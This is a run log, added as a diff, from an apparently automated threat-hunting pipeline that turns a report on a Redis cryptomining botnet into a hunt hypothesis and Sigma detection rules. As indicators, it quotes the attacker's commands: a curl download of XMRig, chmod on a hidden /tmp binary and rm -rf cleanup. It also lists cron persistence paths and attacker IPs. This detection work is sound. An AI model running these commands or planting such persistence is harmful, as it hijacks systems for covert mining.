@@ -1,0 +1,33 @@
+[26b89d +   0.0s] start      cycle 26b89d; drafts today 0/5, research runs today 0/5
+[26b89d +   0.0s] intake     otx: "Redis Cryptomining Botnet Compromised 3,562 Servers, Exposed by the Operator's …" (1683 chars; indicators: FileHash-MD5 1, FileHash-SHA256 1, IPv4 1, domain 1, hostname 1; CTI techniques: none)
+[26b89d +   0.0s] triage     pass (no commentary category or title shape)
+[26b89d +   0.0s] quota      draft slot 1/5 reserved
+[26b89d +   0.0s] route      narrative -> research with web search -> hypothesis
+[26b89d + 580.5s] source     https://hunt.io/blog/redis-cryptomining-botnet-3562-servers (61393 chars, 6 chunk(s)) in 581s: 67 artifact(s) verified, 11 dropped; 17/17 indicator(s) typed; historical: 213.6.207.123, 34.166.99.116, 20.198.10.42, 173.212.244.25, 194.48.248.105
+[26b89d + 580.5s] guidance   the source publishes no detection guidance section
+[26b89d + 580.5s] research   starting: topic "Redis Cryptomining Botnet Compromised 3,562 Servers, Exposed by the Operator's …"; web search on; source text 7494 chars
+[26b89d + 723.2s] research   R-0616 done in 143s; grounding: independent research, 2 web search(es); describes adversary behavior: yes; related hunts: none
+[26b89d + 723.2s] hypothesis asking the model (grounded by R-0616)
+[26b89d + 798.8s] hypothesis done in 76s: "Adversaries use rogue Redis replication to inject malicious RDB blobs into /etc/cron.d/ files to achieve persistence and deploy XMRig crypt…"
+[26b89d + 798.8s] techniques matched in the intel's wording: T1027 Obfuscated Files or Information, T1053.003 Cron, T1059.006 Python, T1213.006 Databases
+[26b89d + 798.9s] techniques described behaviour observed: T1190, T1496, T1564.001, T1071.001, T1053.003, T1027, T1140, T1105, T1070.004, T1059.004, T1571; capability only: none
+[26b89d + 798.9s] techniques model chose T1053.003, T1213.006, T1059.006, T1027; CTI asserted none -> merged T1027, T1053.003, T1059.006, T1213.006, T1190, T1496, T1564.001, T1071.001, T1140, T1105, T1070.004, T1059.004, T1571
+[26b89d + 799.0s] scope      the specimen's evidence shows Linux: Linux (linux, elf, systemd, crontab)
+[26b89d + 799.0s] scope      techniques run on ESXi, Linux, macOS, Network Devices, Windows, IaaS, SaaS, Containers; hypothesis names Linux, Containers
+[26b89d + 799.0s] scope      hypothesis names Linux, Containers; the specimen's evidence shows only Linux: not scoping to Containers
+[26b89d + 799.0s] scope      narrowed to what the hypothesis names: Linux
+[26b89d + 799.0s] scope      platforms Linux; tactics stealth, execution, persistence, privilege-escalation, collection, initial-access, impact, command-and-control; data sources endpoint_data, network_logs, security_events, process_execution, file_operations, network_connections
+[26b89d + 799.0s] claims     audit: 3 flagged
+[26b89d + 799.0s] grounding  H-0618: 2 asserted by CTI, 0 research-only, 13 inferred, 0 UNSUPPORTED
+[26b89d + 799.0s] write      H-0618 written to /tmp/claude-1000/-home-chemch-betas/b11ca954-7e55-4f2b-bd3c-62454d69db20/scratchpad/ws_redis/hunts/2026/Q4/H-0618.md
+[26b89d + 799.0s] sigma      4 command(s) the source shows being run: curl https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz, mv /tmp/xmrig-*/xmrig, chmod +x /tmp/.xmrig, rm -rf /tmp/x.tgz
+[26b89d + 799.1s] sigma      pass 1: 26 exact value(s) from the source rules may match: /etc/cron.d/.redis-miner, /tmp/.xmrig, exploit_wp.py, exploit_wp2.py, wp_scan_results.json, fast_cred_results.json, wp_spray.py, breeze_results.json, vfy_login.py, run_miner.py, rogue_b64.txt, /host_public/run_launch.b64, fleet.b64, verify.html, xmrig-6.22.2-linux-static-x64.tar.gz, SAM.save, SYSTEM.save, rogue_result.txt, /etc/apt/apt.conf.d/99sys-update, /etc/profile.d/sys-init.sh, /etc/cron.d/xminer, /etc/cron.d/redis-miner, /etc/cron.hourly/redis-miner, /etc/cron.d/redis-update, /var/spool/cron/root, /var/spool/cron/crontabs/root
+[26b89d + 799.1s] sigma      drafting rules from techniques T1027, T1053.003, T1059.006, T1213.006, T1190, T1496, T1564.001, T1071.001, T1140, T1105, T1070.004, T1059.004, T1571, indicator types domain, hostname, ipv4, url, platforms Linux
+[26b89d +1086.7s] sigma      rejected file_event: '.init.sh' is not a value the source gives; in file, process, command-line and registry fields use only the EXACT VALUES FROM THE SOURCE listed (wh…
+[26b89d +1086.7s] sigma      rejected network_connection: filter 'filter' excludes 'cron', which matches '/etc/cron.d/.redis-miner', an artifact the hunt names as the threat's own; the rule would d…
+[26b89d +1086.7s] sigma      rejected process_creation: '/redis-server' is not a value the source gives; in file, process, command-line and registry fields use only the EXACT VALUES FROM THE SOURCE…
+[26b89d +1086.7s] sigma      done in 288s: 18 rule(s) kept (dns_query, file_event, network_connection, process_creation, proxy), 3 rejected
+[26b89d +1086.7s] provenance 14 indicator(s) across 18 rule(s), each traced to its source
+[26b89d +1086.7s] review     1 model rule(s) reviewed (Detection of XMRig C2 and Persistence-Related DNS Queries: revise); 2 uncovered behaviour(s): Victim system connecting back to a rogue Redis server to perform replication handshake, Use of hardcoded IP 47.250.92.230 as a QA target across multiple scripts
+[26b89d +1086.7s] grounding  H-0618: 7 asserted by CTI, 0 research-only, 13 inferred, 0 UNSUPPORTED
+[26b89d +1086.7s] done       draft_created -> H-0618 in 1087s
